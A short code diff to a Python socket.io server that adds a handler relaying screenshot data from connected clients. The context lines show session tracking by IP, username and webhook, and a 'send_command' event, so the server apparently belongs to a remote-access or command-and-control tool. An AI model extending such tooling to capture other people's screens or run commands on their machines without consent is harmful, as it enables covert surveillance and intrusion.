@@ -23,6 +23,10 @@ def save_sid(sid, ip, username, server, webhook, avatar, footer):
 def disconnect_sid(sid):
     db.delete_sid(sid)
 
+@sio.event 
+def sending_screenshot(sid, data):
+    print(f'{sid} - sending screenshot')
+    sio.emit('receiving_screenshot', {'data': data['data']})
 
 @sio.event
 def send_command(sid, data):
